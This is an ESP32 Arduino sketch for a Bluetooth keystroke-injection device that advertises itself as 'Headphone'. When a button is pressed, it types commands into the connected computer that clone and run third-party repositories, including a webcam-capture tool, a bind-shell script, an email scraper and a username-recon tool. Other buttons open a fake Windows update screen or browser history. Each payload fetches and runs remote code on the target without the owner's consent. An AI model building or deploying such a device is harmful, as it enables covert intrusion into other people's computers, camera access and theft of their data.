#include <BleKeyboard.h>

#define BUTTON_1_PIN 16 // Button 1 (Trigger: Password Manager)
#define BUTTON_2_PIN 17 // Button 2 (Trigger: Secret Messaging)
#define BUTTON_3_PIN 18 // Button 3 (Trigger: Fake Update Screen)
#define BUTTON_4_PIN 19 // Button 4 (Trigger: CamHacker)
#define BUTTON_7_PIN 23 // Button 7 (Trigger: Chrome History/Downloads)
#define BUTTON_8_PIN 25 // Button 8 (Trigger: HiddenWave)
#define BUTTON_9_PIN 27 // Button 9 (Trigger: CanaryTokensDetector)
#define BUTTON_11_PIN 32 // Button 11 (Trigger: File Encryption)
#define BUTTON_12_PIN 33 // Button 12 (Trigger: Email Scraper)
#define BUTTON_13_PIN 14 // Button 13 (Trigger: Evil Eye)
#define BUTTON_14_PIN 15 // Button 14 (Trigger: Userrecon)

char kbd[] = "Headphone"; // Device Name
BleKeyboard bleKeyboard(kbd, "Espressif", 100);

bool lastState1 = HIGH;
bool lastState2 = HIGH;
bool lastState3 = HIGH;
bool lastState4 = HIGH;
bool lastState7 = HIGH;
bool lastState8 = HIGH;
bool lastState9 = HIGH;
bool lastState11 = HIGH;
bool lastState12 = HIGH;
bool lastState13 = HIGH;
bool lastState14 = HIGH;

void sendString(const char* s, int charDelay = 10) {
  for (size_t i = 0; i < strlen(s); i++) {
    bleKeyboard.print(s[i]);
    delay(charDelay);
  }
}

void openRun() {
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  delay(100);
  bleKeyboard.releaseAll();
  delay(900);
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting BLE HID setup with 15 Triggers on Buttons 1-15 (Pins 16, 17, 18, 19, 21, 22, 23, 25, 27, 26, 32, 33, 14, 15, 13)...");

  pinMode(BUTTON_1_PIN, INPUT_PULLUP);
  pinMode(BUTTON_2_PIN, INPUT_PULLUP);
  pinMode(BUTTON_3_PIN, INPUT_PULLUP);
  pinMode(BUTTON_4_PIN, INPUT_PULLUP);
  pinMode(BUTTON_7_PIN, INPUT_PULLUP);
  pinMode(BUTTON_8_PIN, INPUT_PULLUP);
  pinMode(BUTTON_9_PIN, INPUT_PULLUP);
  pinMode(BUTTON_11_PIN, INPUT_PULLUP);
  pinMode(BUTTON_12_PIN, INPUT_PULLUP);
  pinMode(BUTTON_13_PIN, INPUT_PULLUP);
  pinMode(BUTTON_14_PIN, INPUT_PULLUP);

  Serial.println("Initializing BLE...");
  delay(1000);
  bleKeyboard.begin();
  Serial.println("BLE ready. Connect as 'Headphone'.");
}

void loop() {
  if (bleKeyboard.isConnected()) {
    bool state1 = digitalRead(BUTTON_1_PIN);
    bool state2 = digitalRead(BUTTON_2_PIN);
    bool state3 = digitalRead(BUTTON_3_PIN);
    bool state4 = digitalRead(BUTTON_4_PIN);
    bool state7 = digitalRead(BUTTON_7_PIN);
    bool state8 = digitalRead(BUTTON_8_PIN);
    bool state9 = digitalRead(BUTTON_9_PIN);
    bool state11 = digitalRead(BUTTON_11_PIN);
    bool state12 = digitalRead(BUTTON_12_PIN);
    bool state13 = digitalRead(BUTTON_13_PIN);
    bool state14 = digitalRead(BUTTON_14_PIN);

    // Button 1: Password Manager (Pin 16)
    if (lastState1 == HIGH && state1 == LOW) {
      Serial.println("Button 1: Password Manager (Pin 16)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("powershell", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(4000);
      sendString("cd Desktop", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/sachinpandey7709/Password-Manager.git", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("cd Password-Manager", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python password.py", 10); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(3000);
      Serial.println("Password Manager Payload executed");
    }

    // Button 2: Secret Messaging (Pin 17)
    if (lastState2 == HIGH && state2 == LOW) {
      Serial.println("Button 2: Secret Messaging (Pin 17)");
      bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      sendString("powershell", 50); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(4000);
      sendString("cd Desktop", 50); delay(100); 
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("git clone https://github.com/sachinpandey7709/Secret-Messaging.git", 50); delay(1000); 
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(7000);
      sendString("cd Secret-Messaging", 50); delay(1000); 
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(3000);
      sendString("python code2.py", 50); delay(1000); 
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(3000);
      Serial.println("Secret Messaging Payload executed");
    }

    // Button 3: Fake Update Screen (Pin 18)
    if (lastState3 == HIGH && state3 == LOW) {
      Serial.println("Button 3: Fake Update Screen (Pin 18)");
      openRun();
      sendString("https://fakeupdate.net/win10ue/", 50); delay(100);
      bleKeyboard.press(KEY_RETURN); delay(100); 
      bleKeyboard.press('F4'); 
      bleKeyboard.releaseAll(); delay(1000);
      Serial.println("Fake Update Screen Payload executed");
    }
    
    // Trigger 4: CamHacker (Pin 19)
    if (lastState4 == HIGH && state4 == LOW) {
      Serial.println("Button 4: CamHacker (Pin 19)");
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press(KEY_LEFT_ALT); 
      bleKeyboard.press('t'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
      Serial.println("Terminal opened");
      sendString("git clone https://github.com/KasRoudra/CamHacker", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
      Serial.println("Git clone completed");
      sendString("cd CamHacker", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
      Serial.println("Changed to CamHacker directory");
      sendString("chmod +x ch.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
      Serial.println("Set executable permissions");
      sendString("bash ch.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
      Serial.println("CamHacker Payload executed");
    }

    // Button 7: Chrome History/Downloads (Pin 23)
    if (lastState7 == HIGH && state7 == LOW) {
      Serial.println("Button 7: Chrome History/Downloads (Pin 23)");
      openRun();
      sendString("chrome", 10); delay(2000);
      bleKeyboard.press(KEY_RETURN); delay(100);
      bleKeyboard.releaseAll(); delay(2000);
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press('h'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press('j'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(1000);
      Serial.println("Chrome History/Downloads Payload executed");
    }

    // Button 8: HiddenWave (Pin 25)
    if (lastState8 == HIGH && state8 == LOW) {
      Serial.println("Button 8: HiddenWave (Pin 25)");
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press(KEY_LEFT_ALT); 
      bleKeyboard.press('t'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
      Serial.println("Terminal opened");
      sendString("git clone https://github.com/techchipnet/HiddenWave.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
      Serial.println("Git clone completed");
      sendString("cd HiddenWave", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
      Serial.println("Changed to HiddenWave directory");
      sendString("python3 HiddenWave.py", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
      Serial.println("HiddenWave Payload executed");
    }

    // Button 9: CanaryTokensDetector (Pin 27)
    if (lastState9 == HIGH && state9 == LOW) {
      Serial.println("Button 9: CanaryTokensDetector (Pin 27)");
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press(KEY_LEFT_ALT); 
      bleKeyboard.press('t'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
      Serial.println("Terminal opened");
      sendString("git clone https://github.com/techchipnet/CanaryTokensDetector.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
      Serial.println("Git clone completed");
      sendString("cd CanaryTokensDetector", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
      Serial.println("Changed to CanaryTokensDetector directory");
      sendString("chmod +x canarytokendetector.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
      Serial.println("Set executable permissions");
      sendString("./canarytokendetector.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500);
      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
      Serial.println("CanaryTokensDetector Payload executed");
    }

     // Button 11: File Encryption (Pin 32)
    if (lastState11 == HIGH && state11 == LOW) {
      Serial.println("Button 11: File Encryption (Pin 32)");
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press(KEY_LEFT_ALT); 
      bleKeyboard.press('t'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
      Serial.println("Terminal opened");
      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 50); delay(4000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
      Serial.println("Git clone completed");
      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-", 50); delay(4000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
      Serial.println("Changed to File-Encryption directory");
      sendString("python3 code.py", 50); delay(2000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
      Serial.println("File-Encryption Payload executed");
    }

     // Button 12: Email Scraper (Pin 33)
    if (lastState12 == HIGH && state12 == LOW) {
      Serial.println("Button 12: Email Scraper (Pin 33)");
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press(KEY_LEFT_ALT); 
      bleKeyboard.press('t'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
      Serial.println("Terminal opened");
      sendString("git clone https://github.com/codewithharit/Email-Scraper.git", 50); delay(3000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
      Serial.println("Git clone completed");
      sendString("cd Email-Scraper", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
      Serial.println("Changed to Email-Scraper directory");
      sendString("chmod +x *", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
      Serial.println("Set executable permissions");
      sendString("bash emailscraper.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500);
      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
      Serial.println("Email-Scraper Payload executed");
    }

     // Button 13: Evil Eye (Pin 14)
    if (lastState13 == HIGH && state13 == LOW) {
      Serial.println("Button 13: Evil Eye (Pin 14)");
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press(KEY_LEFT_ALT); 
      bleKeyboard.press('t'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
      Serial.println("Terminal opened");
      sendString("git clone https://github.com/codewithharit/Evil-Eye.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
      Serial.println("Git clone completed");
      sendString("cd Evil-Eye", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
      Serial.println("Changed to Evil-Eye directory");
      sendString("chmod +x *", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
      Serial.println("Set executable permissions");
      sendString("python3 bind.py", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500);
      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
      Serial.println("Evil-Eye Payload executed");
    }

    // Button 14: Userrecon (Pin 15)
    if (lastState14 == HIGH && state14 == LOW) {
      Serial.println("Button 14: Userrecon (Pin 15)");
      bleKeyboard.press(KEY_LEFT_CTRL); 
      bleKeyboard.press(KEY_LEFT_ALT); 
      bleKeyboard.press('t'); 
      delay(100); 
      bleKeyboard.releaseAll(); delay(3000); // Increased for terminal to open
      Serial.println("Terminal opened");
      sendString("git clone https://github.com/wishihab/userrecon.git", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(15000); // Increased for git clone
      Serial.println("Git clone completed");
      sendString("cd userrecon", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Kept for quick cd
      Serial.println("Changed to Userrecon directory");
      sendString("chmod +x *", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500); 
      bleKeyboard.releaseAll(); delay(1000); // Quick chmod
      Serial.println("Set executable permissions");
      sendString("bash userrecon.sh", 50); delay(1000); // 50ms per char, 1000ms before RETURN
      bleKeyboard.press(KEY_RETURN); delay(500);
      bleKeyboard.releaseAll(); delay(10000); // Increased for script startup
      Serial.println("Userrecon Payload executed");
    }

    lastState1 = state1;
    lastState2 = state2;
    lastState3 = state3;
    lastState4 = state4;
    lastState7 = state7;
    lastState8 = state8;
    lastState9 = state9;
    lastState11 = state11;
    lastState12 = state12;
    lastState13 = state13;
    lastState14 = state14;
  } else {
    Serial.println("Waiting for BLE connection...");
  }
  delay(50); // Debounce/stability
}





